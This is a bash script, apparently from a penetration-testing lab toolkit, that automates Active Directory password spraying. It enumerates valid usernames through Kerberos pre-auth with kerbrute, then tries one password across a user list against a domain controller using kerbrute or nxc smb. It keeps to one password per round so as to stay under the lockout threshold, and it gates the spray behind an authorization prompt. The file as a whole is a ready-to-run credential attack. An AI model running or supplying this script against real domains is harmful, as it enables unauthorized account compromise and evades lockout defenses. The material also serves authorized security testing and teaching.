#!/usr/bin/env bash
# Password spraying: one password across many accounts, lockout-aware.
# Mirrors: password-spraying.md and password-spraying-lab-walkthrough.md
#
# Two phases. 'userenum' validates usernames via Kerberos pre-auth (no password
# sent). 'spray' tries ONE password across the user list. Check the account
# lockout policy first (./04-ad-enum.sh ... pass-pol) and keep to one password
# per round so you stay under the lockout threshold.

cd "$(dirname "$0")"
source ./lib.sh

MODE="" DOMAIN="" DC="" USERLIST="" PASSWORD="" ENGINE="kerbrute"
while [[ $# -gt 0 ]]; do
  case "$1" in
    userenum|spray) MODE="$1"; shift ;;
    -d|--domain)   DOMAIN="${2:-}"; shift 2 ;;
    --dc)          DC="${2:-}"; shift 2 ;;
    -U|--users)    USERLIST="${2:-}"; shift 2 ;;
    -p|--password) PASSWORD="${2:-}"; shift 2 ;;
    -e|--engine)   ENGINE="${2:-}"; shift 2 ;;   # kerbrute | nxc
    -h|--help)     MODE="help"; shift ;;
    *)             shift ;;
  esac
done

if [[ "$MODE" == "help" || -z "$MODE" ]]; then
  usage_and_exit "$0 userenum -d <domain> --dc <dc-ip> -U <users.txt>
       $0 spray    -d <domain> --dc <dc-ip> -U <users.txt> -p <password> [-e kerbrute|nxc]"
fi

[[ -n "$DOMAIN" && -n "$DC" && -n "$USERLIST" ]] || usage_and_exit "missing -d/--dc/-U"
[[ -f "$USERLIST" ]] || die "User list not found: $USERLIST"

if [[ "$MODE" == "userenum" ]]; then
  need kerbrute
  info "Validating usernames via Kerberos pre-auth (no passwords sent)."
  run kerbrute userenum -d "$DOMAIN" --dc "$DC" "$USERLIST"
  exit 0
fi

# spray
[[ -n "$PASSWORD" ]] || usage_and_exit "spray needs -p <password>"
authorize "accounts in '$USERLIST' on domain '$DOMAIN' (DC $DC)"
warn "Spray ONE password per round. Confirm the lockout policy first:"
warn "  ./04-ad-enum.sh -H $DC -u <user> -p <pass> pass-pol"

case "$ENGINE" in
  kerbrute) need kerbrute
            run kerbrute passwordspray -d "$DOMAIN" --dc "$DC" "$USERLIST" "$PASSWORD" ;;
  nxc)      need nxc
            run nxc smb "$DC" -u "$USERLIST" -p "$PASSWORD" --continue-on-success ;;
  *)        die "Unknown engine '$ENGINE' (use kerbrute or nxc)" ;;
esac
